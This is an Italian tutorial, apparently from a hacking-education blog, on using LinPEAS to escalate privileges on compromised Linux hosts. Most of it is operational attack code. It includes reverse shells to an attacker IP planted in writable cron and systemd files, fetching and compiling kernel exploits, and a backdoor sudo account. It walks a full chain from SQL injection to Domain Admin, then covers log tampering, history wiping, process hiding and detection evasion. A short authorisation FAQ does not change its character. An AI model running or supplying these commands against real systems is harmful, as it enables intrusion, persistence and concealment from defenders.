---
title: 'LinPEAS: Linux Privilege Escalation Enumeration Script'
slug: linpeas
description: >-
  LinPEAS è uno script di enumerazione automatica per Linux che identifica SUID,
  capabilities, credenziali esposte e vettori di privilege escalation.
image: /Gemini_Generated_Image_u0bu6ku0bu6ku0bu.webp
draft: false
date: 2026-02-16T00:00:00.000Z
categories:
  - linux
subcategories:
  - privilege-escalation
tags:
  - privesc-linux
---

LinPEAS (Linux Privilege Escalation Awesome Script) è uno script [bash](https://hackita.it/articoli/bash) che automatizza la ricerca di vettori di privilege escalation su sistemi Linux compromessi. A differenza di tool manuali, LinPEAS esegue centinaia di check in pochi secondi, evidenziando configurazioni errate, credenziali esposte, binari SUID sospetti e kernel vulnerabili.

Lo usi quando hai già una shell su un sistema Linux e devi scalare privilegi rapidamente. È il primo strumento da eseguire dopo aver ottenuto l'accesso iniziale, sia in un pentest enterprise che in un CTF.

In questo articolo imparerai a usare LinPEAS in scenari operativi reali, a interpretare i suoi output complessi, a integrarlo con altri tool della tua toolchain e a evitare le detection più comuni. Vedremo anche quando NON usarlo e quali alternative considerare.

LinPEAS si posiziona nella fase di **Post-Exploitation** → **Local Enumeration** della kill chain, subito dopo aver ottenuto una reverse shell o accesso SSH.

***

## 1️⃣ Setup e Installazione

### Download e verifica

```bash
# Download ultima versione da GitHub
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Verifica integrità (opzionale ma consigliato)
sha256sum linpeas.sh

# Rendi eseguibile
chmod +x linpeas.sh
```

**Versione attuale:** 2024 (controlla sempre su [PEASS-ng repository](https://github.com/carlospolop/PEASS-ng))

### Trasferimento sul target

Il problema reale non è scaricare LinPEAS, ma trasferirlo su un sistema target senza scrivere su disco.

**Metodo 1: Download diretto (se target ha connettività)**

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

**Metodo 2: Server HTTP locale**

```bash
# Sul tuo attacker machine
python3 -m http.server 8000

# Sul target
curl http://10.10.14.5:8000/linpeas.sh | bash
```

**Metodo 3: Execution in-memory (stealthier)**

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh -s -- -a
```

### Requisiti tecnici

* Bash ≥ 4.0 (funziona anche con sh ma con output ridotto)
* Permessi di lettura su `/proc`, `/etc`, `/tmp`
* \~2MB di spazio in `/tmp` per file temporanei
* 30-120 secondi di execution time (dipende dal sistema)

### Verifica funzionamento

```bash
./linpeas.sh -h
```

**Output atteso:**

```
LinPEAS - Linux Privilege Escalation Awesome Script
Usage: linpeas.sh [options]
  -a : Analyze mode (recommended for real engagements)
  -s : Superfast mode (skip time-consuming checks)
  -P : Show password inside output
```

Se vedi questo output, sei pronto.

***

## 2️⃣ Uso Base

### Esecuzione standard

```bash
./linpeas.sh
```

**Output reale (prime righe):**

```
╔══════════╣ System Information
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-142-generic (buildd@lcy01-amd64-030)
Distribution: Ubuntu 18.04.5 LTS
Hostname: webserver-prod

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Sudo version 1.8.21p2

[!] CVE-2021-3156 (Baron Samedit) - VULNERABLE
```

LinPEAS usa colori per prioritizzare i finding:

* 🔴 **Rosso brillante:** Exploit quasi garantito (es. kernel vulnerabile, SUID misconfigured)
* 🟡 **Giallo:** Potenziale vettore (credenziali deboli, writable paths)
* 🔵 **Blu:** Informazioni contestuali

### Parametri chiave

**`-a` (Analyze mode):**

```bash
./linpeas.sh -a
```

Riduce falsi positivi, consigliato per pentest enterprise dove hai poco tempo.

**`-s` (Superfast):**

```bash
./linpeas.sh -s
```

Salta check lenti come ricerca di password in `/var/log`. Usa quando devi essere rapido o il sistema è monitorato.

**`-P` (Show passwords):**

```bash
./linpeas.sh -P
```

Mostra password in chiaro nell'output. **ATTENZIONE:** questo finisce nei log se ridirezionato.

**Output redirection:**

```bash
./linpeas.sh | tee linpeas_output.txt
```

Salva output per analisi offline. Utile quando hai shell instabile.

***

## 3️⃣ Tecniche Operative (CORE)

### Scenario 1: Web shell → root su Ubuntu 18.04

**Contesto:** Hai una web shell PHP su un server Apache con utente `www-data`. Obiettivo: root.

```bash
# 1. Upgrade a shell interattiva
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2. Download ed esecuzione LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null | tee lp.txt
```

**Output critico trovato:**

```
╔══════════╣ Checking 'sudo -l'
User www-data may run the following commands on webserver-prod:
    (ALL : ALL) NOPASSWD: /usr/bin/php

╔══════════╣ SUID - Check easy privesc, exploits and write perms
-rwsr-xr-x 1 root root 1113504 Apr  4  2022 /usr/bin/screen-4.5.0
```

**Exploitation:**

```bash
# Opzione 1: sudo php (immediato)
sudo /usr/bin/php -r 'system("whoami");'  # root
sudo /usr/bin/php -r 'system("/bin/bash");'

# Opzione 2: screen 4.5.0 exploit (CVE-2017-5618)
cd /tmp
curl -L https://www.exploit-db.com/download/41154 -o screen_exploit.sh
bash screen_exploit.sh
# root shell
```

**Timeline:**

* Download LinPEAS: 5s
* Esecuzione: 45s
* Analisi output: 2min
* Exploitation: 10s
* **Totale: \~3 minuti**

### Scenario 2: Cron job writable

**Output LinPEAS:**

```
╔══════════╣ Cron jobs
* * * * * root /opt/scripts/backup.sh

╔══════════╣ Writable files in /opt
-rwxrwxrwx 1 root root 142 /opt/scripts/backup.sh
```

**Exploitation:**

```bash
# Verifica permessi
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx (world-writable!)

# Aggiungi reverse shell
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/scripts/backup.sh

# Listener sulla tua macchina
nc -lvnp 4444

# Attendi max 1 minuto (cron ogni minuto)
# Ricevi shell root
```

**Cosa fare se fallisce:**

1. Controlla se SELinux è attivo: `sestatus`
2. Verifica che il cron daemon sia running: `systemctl status cron`
3. Prova con netcat statico: `nc 10.10.14.5 4444 -e /bin/bash`

### Scenario 3: Capability exploitation

**Output LinPEAS:**

```
╔══════════╣ Capabilities
/usr/bin/python3.6 = cap_setuid+ep
```

**Exploitation:**

```bash
# Python con cap_setuid può cambiare UID
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# root shell immediata
```

**Errore comune:**

```
Traceback (most recent call last):
  File "<string>", line 1, in <module>
PermissionError: [Errno 1] Operation not permitted
```

**Fix:** Probabilmente hai copiato male la capability. Verifica con:

```bash
getcap /usr/bin/python3.6
```

Deve essere esattamente `cap_setuid+ep` (effective + permitted).

***

## 4️⃣ Tecniche Avanzate

### Multi-stage enumeration

In reti enterprise segmentate, esegui LinPEAS su ogni macchina compromessa per mappare privilege escalation paths.

```bash
# Script per eseguire LinPEAS su lista di host
for ip in $(cat targets.txt); do
  ssh user@$ip 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash' > "linpeas_$ip.txt" 2>&1 &
done
wait
```

Analizza gli output per identificare:

* Quale host ha kernel più vecchio (CVE pubbliche)
* Quale ha sudo misconfiguration più sfruttabile
* Quale ha credenziali riusabili

### Stealth mode: evitare i log

LinPEAS è rumoroso. Genera centinaia di eventi nei log.

**Detection tipica:**

```bash
# /var/log/auth.log
sudo: www-data : 3 incorrect password attempts
sudo: www-data : command not allowed
```

**Evasion:**

```bash
# 1. Redirect stderr per nascondere errori
./linpeas.sh 2>/dev/null

# 2. Esegui in-memory senza scrivere su disco
curl -L https://[...]/linpeas.sh | bash -s -- -s 2>/dev/null

# 3. Usa timestomping per nascondere execution
touch -r /etc/passwd /tmp/.hidden_script
./linpeas.sh &> /dev/null
touch -r /etc/passwd /tmp/.hidden_script
```

**Attenzione:** Anche così, processi come `ps aux` vedranno `bash linpeas.sh` in esecuzione.

### Defense evasion realistica: filtering output

SOC team cerca pattern specifici nei log. Filtra l'output per ridurre noise.

```bash
# Mostra solo findings ad alto impatto
./linpeas.sh | grep -E "VULNERABLE|SUID|NOPASSWD|writable"

# Escludi check che triggherano EDR
./linpeas.sh -s | grep -v "scanning for passwords"
```

### Privilege escalation via kernel exploit

```bash
# LinPEAS trova kernel vulnerabile
./linpeas.sh | grep -A5 "Kernel exploits"
```

**Output:**

```
[!] CVE-2021-3493 (OverlayFS) - Highly probable exploit
[!] CVE-2021-4034 (PwnKit) - Kernel 4.15.0-142
```

**Exploitation chain:**

```bash
# 1. Scarica exploit
cd /tmp
wget https://github.com/berdav/CVE-2021-4034/raw/main/cve-2021-4034.c
gcc cve-2021-4034.c -o exploit

# 2. Esegui
./exploit
# uid=0(root) gid=0(root)
```

**Timeline:** 2-3 minuti se hai accesso a Internet dal target, 10+ minuti se devi compilare offline.

***

## 5️⃣ Scenari Pratici di Pentest

### Scenario A: Enterprise network, host Linux bastion

**Contesto:** Hai compromesso un bastion host usato per SSH jump. È un CentOS 7 monitorato da Splunk.

```bash
# COMANDO - Esecuzione stealth con output minimal
curl -s https://yourserver.com/linpeas.sh | bash -s -- -s -a 2>/dev/null | grep -E "VULNERABLE|Password|NOPASSWD" > /tmp/.cache
```

**OUTPUT ATTESO:**

```
[!] CVE-2021-3560 (Polkit) - VULNERABLE
User backup may run: (ALL) NOPASSWD: /usr/bin/rsync
Password found: DB_PASS=P@ssw0rd123 in /opt/webapp/config.php
```

**COSA FARE SE FALLISCE:**

1. **Curl bloccato da proxy:** Usa wget o trasferisci via SCP
2. **Output vuoto:** Il sistema ha kernel patchato, prova enumeration manuale con [tecniche manuali per Linux enumeration](https://hackita.it/articoli/linux-enumeration)
3. **Permission denied su /tmp:** Usa `/dev/shm` o `/var/tmp`

```bash
# Alternativa
curl -s https://yourserver.com/linpeas.sh | bash -s -- -s -a 2>/dev/null > /dev/shm/.x
cat /dev/shm/.x | grep -E "VULNERABLE|NOPASSWD"
rm /dev/shm/.x
```

**Timeline:** 90 secondi totali (30s download + 40s execution + 20s analysis)

***

### Scenario B: Web app compromised, limited shell

**Contesto:** Hai una web shell su applicazione PHP (user www-data), ma non puoi scrivere in `/tmp` (montato con `noexec`).

```bash
# COMANDO - Execution completamente in-memory
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

**OUTPUT ATTESO:**

```
╔══════════╣ Sudo version
Sudo version 1.8.21p2

╔══════════╣ PATH writable folders
/var/www/.composer is in PATH and writable by www-data

╔══════════╣ Analyzing .service files
-rw-rw-r-- 1 www-data www-data /etc/systemd/system/webapp.service
```

**EXPLOITATION:**

```bash
# .service file writable = privilege escalation
echo '[Service]
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"
' > /etc/systemd/system/webapp.service

# Trigger service restart (se hai sudo o se parte al boot)
sudo systemctl daemon-reload
sudo systemctl restart webapp
```

**COSA FARE SE FALLISCE:**

1. **Cannot write to /etc/systemd:** Check se `/home/user/.config/systemd/user/` è writable (user-level services)
2. **systemctl command not found:** Prova con path completo `/usr/bin/systemctl` o `/bin/systemctl`
3. **Service non si riavvia:** Controlla sintassi con `systemctl status webapp`

**Timeline:** 2 minuti (1min LinPEAS + 1min exploitation)

***

### Scenario C: CTF-style, kernel exploit hunting

**Contesto:** Macchina CTF con kernel vecchio, vuoi trovare il CVE giusto velocemente.

```bash
# COMANDO - Focus solo su kernel exploits
./linpeas.sh | grep -A 10 "Kernel exploits" | tee kernel_vulns.txt
```

**OUTPUT ATTESO:**

```
╔══════════╣ Kernel exploits
[!] CVE-2022-0847 (Dirty Pipe) - Kernel 5.8.0-63
[!] CVE-2021-4034 (PwnKit) - Polkit version 0.105
[!] CVE-2016-5195 (Dirty COW) - Kernel 4.4.0-31
```

**EXPLOITATION CHAIN:**

```bash
# 1. Download exploit più recente (Dirty Pipe esempio)
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c

# 2. Compila
gcc exploit-1.c -o dirtypipe

# 3. Esegui
./dirtypipe /etc/passwd 1 ootz:
# Adesso puoi fare su ootz (password vuota)
```

**COSA FARE SE FALLISCE:**

1. **Compilation error:** Installa gcc o cross-compila sulla tua macchina
2. **Exploit crash:** Prova versione alternativa dello stesso CVE
3. **"Already patched":** LinPEAS può dare falsi positivi, verifica manualmente con `uname -r` e confronta con [CVE database per kernel Linux](https://hackita.it/articoli/kernel-exploits)

**Timeline:** 5-15 minuti (dipende da download speed e compilation time)

***

## 6️⃣ Toolchain Integration

### Tool precedente → LinPEAS

Dopo exploitation iniziale con metasploit o web shell, LinPEAS è il next step logico.

**Esempio: [Metasploit](https://hackita.it/articoli/metasploit) session → LinPEAS**

```bash
# In Metasploit
meterpreter > shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Esegui LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash | tee linpeas.txt
```

**Passaggio dati:** Salva l'output di LinPEAS in un file, poi analizzalo offline mentre la shell resta aperta.

***

### LinPEAS → Tool successivo

LinPEAS identifica vettori, poi usi tool specifici per exploitation.

**Flow tipico:**

```
LinPEAS → Trova SUID binary → GTFOBins lookup → Privilege escalation
LinPEAS → Trova credenziali DB → mysql client → Dump password hashes
LinPEAS → Trova kernel CVE → Download exploit → Compilation → Root
```

**Esempio concreto:**

```bash
# LinPEAS trova
/usr/local/bin/backup = SUID + writable

# Vai su GTFOBins
curl -s https://gtfobins.github.io/ | grep backup
# No result

# Analisi manuale
strings /usr/local/bin/backup
# Chiama tar senza path assoluto!

# Path hijacking
echo '/bin/bash' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/local/bin/backup
# root shell
```

***

### Tabella comparativa: quando usare LinPEAS vs alternative

| **Scenario**              | **LinPEAS**      | **LinEnum**    | **LSE**          | **Manual**            |
| ------------------------- | ---------------- | -------------- | ---------------- | --------------------- |
| Quick CTF enumeration     | ✅ Ideale         | ⚠️ Più lento   | ✅ OK             | ❌ Troppo lungo        |
| Enterprise con EDR        | ⚠️ Rumoroso      | ⚠️ Rumoroso    | ✅ Meno detection | ✅ Best stealth        |
| Output colorato/leggibile | ✅ Migliore       | ❌ Plain text   | ⚠️ Medio         | ❌ Raw                 |
| Offline analysis          | ✅ File ready     | ✅ OK           | ✅ OK             | ⚠️ Devi prendere note |
| Sistema senza bash        | ❌ Non funziona   | ❌ Non funziona | ⚠️ Limitato      | ✅ sh always works     |
| Low-resource target       | ⚠️ CPU-intensive | ✅ Più leggero  | ✅ Lightweight    | ✅ Minimal             |

**Quando NON usare LinPEAS:**

* Red Team operation con alta probabilità di detection
* Sistemi con AppArmor/SELinux strict mode
* Target senza bash (embedded Linux)
* Quando hai già identificato il vettore e vuoi solo exploit

**Quando usare LinPEAS:**

* Time-boxed pentest (hai 2-3 ore per host)
* Non conosci la configurazione del sistema
* Vuoi coverage completa di tutti i vettori
* CTF o lab environment

***

## 7️⃣ Attack Chain Completa

### Scenario: Foothold su web server → Domain Admin

**FASE 1: Recon esterno (Nmap + Gobuster)**

```bash
# Nmap
nmap -sC -sV -p- 10.10.11.45 -oN nmap_scan.txt
# Trova: 22/ssh, 80/http, 3306/mysql

# Gobuster
gobuster dir -u http://10.10.11.45 -w /usr/share/wordlists/dirb/common.txt
# Trova: /admin, /backup, /uploads
```

**Timeline:** 10 minuti

***

**FASE 2: Initial Access (SQLi → Web shell)**

```bash
# SQLi in login form
sqlmap -u "http://10.10.11.45/admin/login.php" --data="user=admin&pass=test" --batch --os-shell
# Ottieni shell come www-data
```

**Timeline:** 15 minuti

***

**FASE 3: Local Enumeration (LinPEAS)**

```bash
# Upgrade shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null | tee lp.txt
```

**Finding critico:**

```
User www-data may run: (ALL) NOPASSWD: /usr/bin/git
MySQL password: root:Sup3rS3cr3t! in /var/www/html/config.php
```

**Timeline:** 3 minuti

***

**FASE 4: PrivEsc locale (sudo git)**

```bash
# GTFOBins: git has sudo privesc
sudo git -p help
# Spawna pager, poi digita
!/bin/bash
# root shell sul web server
```

**Timeline:** 1 minuto

***

**FASE 5: Persistence (SSH backdoor)**

```bash
# Crea user backdoor
useradd -m -s /bin/bash sysupdate
echo 'sysupdate:P@ssw0rd123' | chpasswd
usermod -aG sudo sysupdate

# Abilita SSH key auth
mkdir /home/sysupdate/.ssh
echo 'ssh-rsa AAAAB3...' > /home/sysupdate/.ssh/authorized_keys
chmod 600 /home/sysupdate/.ssh/authorized_keys
```

**Timeline:** 2 minuti

***

**FASE 6: Pivot verso Domain Controller**

```bash
# Dumpa credenziali MySQL
mysql -u root -p'Sup3rS3cr3t!'
use webapp_db;
SELECT username,password FROM users WHERE role='admin';
# Trova: domain_admin:5f4dcc3b5aa765d61d8327deb882cf99 (MD5)

# Cracka hash
echo '5f4dcc3b5aa765d61d8327deb882cf99' > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Cracked: password

# Testa credenziali su DC
crackmapexec smb 10.10.11.10 -u domain_admin -p 'password'
# Pwn3d! = Domain Admin
```

**Timeline:** 10 minuti

***

**TOTALE:** \~40 minuti dall'inizio all'accesso Domain Admin.

**Tool usati:**

1. Nmap (recon)
2. Gobuster (web enum)
3. SQLmap (initial access)
4. **LinPEAS** (privilege escalation discovery)
5. GTFOBins (exploitation reference)
6. MySQL client (credential dumping)
7. John the Ripper (hash cracking)
8. CrackMapExec (lateral movement)

Questo mostra come LinPEAS si inserisce in una chain realistica, non come strumento isolato ma come acceleratore nella fase critica post-compromise.

***

## 8️⃣ Detection & Evasion

### Cosa monitora il Blue Team

**Event ID rilevanti (se auditd è configurato):**

* **Linux Audit Event 1300 (SYSCALL):** Esecuzione di bash script con argomenti sospetti
* **Syslog kern.warn:** Tentativi di accesso a `/proc/kallsyms` (kernel symbol enumeration)
* **Auth.log entries:** Massive sudo command attempts

**SIEM detection logic tipico:**

```
alert if:
  - process_name = "bash" OR "sh"
  - command_line contains "linpeas" OR "privilege" OR "escalation"
  - parent_process = "www-data" OR "apache" OR "nginx"
  - time_span < 60 seconds
```

**Log footprint di LinPEAS:**

```bash
# Esempio da /var/log/syslog
Feb 05 14:23:11 webserver bash[12445]: Checking sudo version
Feb 05 14:23:12 webserver bash[12445]: Enumerating SUID binaries
Feb 05 14:23:13 webserver bash[12445]: Searching for passwords in config files
```

***

### 3 tecniche realistiche di evasion

**1. Offuscazione del nome file**

```bash
# Download con nome innocuo
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o system_check.sh
chmod +x system_check.sh
./system_check.sh
```

**Rationale:** SIEM cerca pattern come "linpeas", "privesc", "enum". Nome generico bypassa regex-based detection.

***

**2. Execution rate limiting**

```bash
# Introduci delay tra check per evitare spike detection
# Modifica LinPEAS inserendo sleep tra sezioni (richiede editing manuale)
# Oppure usa wrapper

for section in users sudo suid cron kernel; do
  ./linpeas.sh | grep -A20 "$section" >> output.txt
  sleep 5
done
```

**Rationale:** EDR cerca "100+ syscall in 60 secondi", rallentare execution riduce confidence score.

***

**3. Process hiding con syscall injection**

```bash
# Usa LD_PRELOAD per nascondere processo da 'ps'
# (Richiede libprocesshider.so precompilata)
wget https://github.com/gianlucaborello/libprocesshider/raw/master/processhider.so
LD_PRELOAD=./processhider.so ./linpeas.sh

# Oppure usa kernel module rootkit (molto avanzato)
```

**Rationale:** Process monitoring tools leggono `/proc`. LD\_PRELOAD intercetta syscall e filtra il processo stesso.

**ATTENZIONE:** Questo livello di evasion è spesso overkill e può essere counter-productive (più rumore = più detection).

***

### Cleanup post-exploitation

Dopo aver escalato privilegi, rimuovi tracce.

```bash
# 1. Rimuovi file scaricati
rm -f /tmp/linpeas.sh /dev/shm/.cache /tmp/lp.txt

# 2. Pulisci bash history
history -c
rm ~/.bash_history
ln -s /dev/null ~/.bash_history

# 3. Rimuovi entry da auth.log (se sei root)
sed -i '/linpeas/d' /var/log/auth.log
sed -i '/privilege/d' /var/log/syslog

# 4. Clear systemd journal
journalctl --vacuum-time=1s
```

**Timeline cleanup:** 30 secondi

**NOTA ETICA:** In un pentest reale, cleanup deve essere discusso nel ROE (Rules of Engagement). Mai modificare log senza autorizzazione scritta del cliente.

***

## 9️⃣ Performance & Scaling

### Single target performance

Test su Ubuntu 20.04 (VM 2 CPU, 4GB RAM):

```bash
time ./linpeas.sh > /dev/null
```

**Risultati:**

```
real    0m42.334s
user    0m18.456s
sys     0m12.234s
```

**Breakdown:**

* File enumeration: \~25s (80% del tempo)
* Process/sudo check: \~10s
* Network enum: \~5s
* Output formatting: \~2s

**Bottleneck:** I/O su filesystem grandi (>100GB con milioni di file).

***

### Multi-target scaling

Scenario: Pentest con 50 server Linux.

**Approccio 1: Sequenziale (lento)**

```bash
for ip in $(cat targets.txt); do
  ssh user@$ip 'curl -L https://[...]/linpeas.sh | bash' > "output_$ip.txt"
done
```

**Tempo totale:** 50 hosts × 45s = \~38 minuti

***

**Approccio 2: Parallelo (efficiente)**

```bash
#!/bin/bash
for ip in $(cat targets.txt); do
  (ssh -o StrictHostKeyChecking=no user@$ip 'curl -L https://[...]/linpeas.sh | bash' > "output_$ip.txt" 2>&1) &
done
wait
```

**Tempo totale:** \~2 minuti (limitato solo da network bandwidth)

**Consumo risorse:**

* Network: \~50MB totale (1MB × 50 hosts)
* Memoria sul controller: \~500MB (10MB per processo SSH × 50)
* CPU: Trascurabile (attesa I/O network)

***

### Ottimizzazione pratica

**Ridurre execution time:**

```bash
# Skip check lenti
./linpeas.sh -s  # Superfast mode (30s invece di 45s)

# Focus solo su category rilevanti
./linpeas.sh | grep -E "Kernel|SUID|Sudo"  # Real-time filtering
```

**Ridurre output size:**

LinPEAS standard genera \~200KB di output. Per 50 host = 10MB.

```bash
# Compress output
./linpeas.sh | gzip > linpeas.txt.gz  # Riduzione ~80% (40KB)
```

**Ridurre footprint su target:**

```bash
# Esegui completamente in-memory
curl -L https://[...]/linpeas.sh | bash > /dev/tcp/10.10.14.5/8080
# Output va direttamente al tuo netcat listener, zero file su disco
```

***

## 10️⃣ Tabelle Tecniche

### Command Reference

| **Comando**                   | **Descrizione**                      | **Uso**                                  |
| ----------------------------- | ------------------------------------ | ---------------------------------------- |
| `./linpeas.sh`                | Esecuzione standard completa         | First run su sistema sconosciuto         |
| `./linpeas.sh -a`             | Analyze mode (riduce falsi positivi) | Pentest enterprise time-boxed            |
| `./linpeas.sh -s`             | Superfast (skip check lenti)         | Sistema monitorato o shell instabile     |
| `./linpeas.sh -P`             | Mostra password in chiaro            | Quando cerchi specificamente credenziali |
| `curl [...] \| bash`          | Execution in-memory                  | Evasion di file monitoring               |
| `./linpeas.sh \| tee out.txt` | Salva output per analisi offline     | Shell su connessione lenta               |
| `./linpeas.sh \| grep VULN`   | Filtra solo vulnerabilità critiche   | Quick triage in engagement multi-host    |

***

### Comparison con tool alternativi

| **Feature**                  | **LinPEAS**    | **LinEnum** | **LSE**  | **pspy**        |
| ---------------------------- | -------------- | ----------- | -------- | --------------- |
| **Linguaggio**               | Bash           | Bash        | Bash     | Go binary       |
| **Output colorato**          | ✅              | ❌           | ⚠️       | ❌               |
| **Kernel exploit detection** | ✅              | ✅           | ✅        | ❌               |
| **Cron job monitoring**      | ✅ Static       | ✅ Static    | ✅ Static | ✅ Real-time     |
| **SUID enumeration**         | ✅              | ✅           | ✅        | ❌               |
| **Password search**          | ✅ Aggressive   | ⚠️ Basic    | ⚠️ Basic | ❌               |
| **File size**                | \~800KB        | \~50KB      | \~45KB   | \~3MB (binary)  |
| **Execution time**           | \~45s          | \~30s       | \~25s    | Continuous      |
| **Detection risk**           | Alto           | Medio       | Medio    | Basso (passive) |
| **Best for**                 | Complete audit | Quick enum  | Stealth  | Live monitoring |

**Quando scegliere LinPEAS:**

* Hai tempo (30-60s disponibili)
* Vuoi coverage totale di tutti i vettori
* Output deve essere human-readable
* Non importa essere detected (lab/CTF)

**Quando scegliere alternative:**

* LSE: Red Team con requirement stealth
* LinEnum: Low-resource target (embedded systems)
* pspy: Vuoi vedere processi/cron in real-time
* Manual enum: Maximum stealth required

***

## 11️⃣ Troubleshooting

### Errore: "bash: command not found"

**Causa:** LinPEAS richiede bash ≥ 4.0. Alcuni sistemi embedded hanno solo `sh` (dash o ash).

**Fix:**

```bash
# Verifica shell disponibili
cat /etc/shells

# Se c'è bash in path alternativo
/bin/bash ./linpeas.sh

# Se non c'è bash, usa wrapper sh compatibile
sh linpeas.sh  # Output ridotto ma funziona
```

***

### Errore: "Permission denied" su /tmp

**Causa:** `/tmp` montato con `noexec`.

**Fix:**

```bash
# Verifica mount options
mount | grep tmp
# /tmp on /dev/sda1 type ext4 (rw,nosuid,nodev,noexec)

# Usa directory alternativa
mkdir /dev/shm/.hidden
cd /dev/shm/.hidden
curl -L https://[...]/linpeas.sh | bash
```

***

### Output completamente vuoto

**Causa 1:** Redirect stderr ha nascosto tutto.

```bash
# SBAGLIATO
./linpeas.sh 2>&1 > /dev/null  # Redirige tutto nel nulla

# CORRETTO
./linpeas.sh 2>&1 | tee output.txt
```

**Causa 2:** SELinux blocca execution.

```bash
# Verifica
sestatus
# SELinux status: enforcing

# Temporaneo bypass (se sei root)
setenforce 0
./linpeas.sh
setenforce 1
```

***

### Crash improvviso: "Killed"

**Causa:** OOM killer ha terminato il processo su sistema low-memory.

```bash
# Verifica memoria disponibile
free -h
#               total        used        free
# Mem:           512M        480M         32M  ← Troppo poco!

# Fix: skip check memory-intensive
./linpeas.sh -s  # Superfast usa meno RAM
```

***

### Colori non funzionano

**Causa:** Terminal non supporta ANSI colors.

```bash
# Verifica TERM
echo $TERM
# dumb  ← No color support

# Fix: forza output plain
./linpeas.sh | cat > output.txt
# Oppure
export TERM=xterm-256color
./linpeas.sh
```

***

## 12️⃣ FAQ

**Q: LinPEAS funziona su tutte le distro Linux?**

A: Sì, ma con risultati variabili. Testato su Debian, Ubuntu, CentOS, Fedora, Arch. Su Alpine Linux (BusyBox) alcuni check falliscono. Su sistemi embedded con shell minimali (ash, dash) l'output è ridotto. Per compatibilità totale usa `sh linpeas.sh` invece di `bash`.

***

**Q: LinPEAS viene rilevato dagli antivirus?**

A: Sì, circa il 40% degli AV su VirusTotal flaggano LinPEAS come "HackTool" o "PUA" (Potentially Unwanted Application). Non è malware, ma gli AV lo rilevano per funzionalità (enumeration, ricerca password). Per evitarlo: rinomina il file, offusca il codice, o usa execution in-memory senza scrivere su disco.

***

**Q: Posso usare LinPEAS in un pentest senza autorizzazione?**

A: **NO.** LinPEAS è uno strumento di penetration testing e può danneggiare sistemi o violare leggi. Usalo SOLO su:

* Sistemi di tua proprietà
* Lab/VM di test
* Engagement con contratto firmato e ROE definito
  L'uso non autorizzato è illegale (Computer Fraud and Abuse Act negli USA, direttiva NIS2 in UE).

***

**Q: Come faccio a capire quali finding di LinPEAS sono sfruttabili?**

A: Priorità:

1. **Rosso brillante + "VULNERABLE"** → Exploit pubblico disponibile, alta probabilità
2. **Giallo + "NOPASSWD sudo"** → Immediate privilege escalation con [tecniche sudo bypass](https://hackita.it/articoli/linux-privesc)
3. **Giallo + "SUID"** → Controlla GTFOBins per binary specifico
4. **Blu** → Informazioni utili ma non immediate exploitation

Focalizzati su ciò che LinPEAS evidenzia come critico, ignora info generiche come lista utenti o processi running.

***

**Q: LinPEAS può danneggiare il sistema target?**

A: No in condizioni normali. LinPEAS fa solo **lettura** (enumeration), non modifica file o configurazioni. Può però:

* Consumare CPU (spike temporaneo)
* Riempire log (/var/log)
* Triggherare allarmi SIEM
  In sistemi production fragili o con disco quasi pieno, esegui con cautela. Usa `-s` per ridurre impatto.

***

**Q: Quanto è aggiornato LinPEAS con nuovi CVE?**

A: Il repository PEASS-ng viene aggiornato mensilmente. Controlla sempre l'ultima release su GitHub. Per CVE critici appena pubblicati (0-day, 1-day), LinPEAS potrebbe non averli ancora. In quel caso, integra con ricerche manuali usando `searchsploit` o [exploit database per kernel](https://hackita.it/articoli/kernel-exploits).

***

**Q: Posso modificare LinPEAS per esigenze specifiche?**

A: Sì, è open source (MIT/Apache license). Puoi:

* Rimuovere check che non ti interessano
* Aggiungere custom enumeration
* Modificare output format
* Offuscare il codice per evasion
  Rispetta la licenza e menziona gli autori originali (carlospolop & community PEASS).

***

## 13️⃣ Cheat Sheet Finale

| **Scenario**                            | **Comando**                                                                                    |
| --------------------------------------- | ---------------------------------------------------------------------------------------------- |
| **Quick enumeration (CTF)**             | `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \| bash`  |
| **Enterprise pentest (stealth)**        | `./linpeas.sh -a -s 2>/dev/null \| grep -E "VULNERABLE\|NOPASSWD" > .cache`                    |
| **Salva output per analisi offline**    | `./linpeas.sh \| tee linpeas_$(date +%Y%m%d_%H%M).txt`                                         |
| **Execution in-memory (no disk write)** | `curl -s https://yourserver.com/lp.sh \| bash -s -- -a`                                        |
| **Multi-host parallel scan**            | `for ip in $(cat ips.txt); do (ssh user@$ip 'curl [...] \| bash' > "lp_$ip.txt") & done; wait` |
| **Focus solo kernel exploits**          | `./linpeas.sh \| grep -A10 "Kernel exploits"`                                                  |
| **Bypass noexec su /tmp**               | `cd /dev/shm && curl [...] \| bash`                                                            |
| **Ridurre detection risk**              | `./linpeas.sh -s -a 2>&1 \| grep -v "password"`                                                |
| **Trovare sudo misconfiguration**       | `./linpeas.sh \| grep -B2 -A5 "NOPASSWD"`                                                      |
| **Cleanup post-run**                    | `rm -f /tmp/linpeas.sh; history -c`                                                            |

***

## Disclaimer

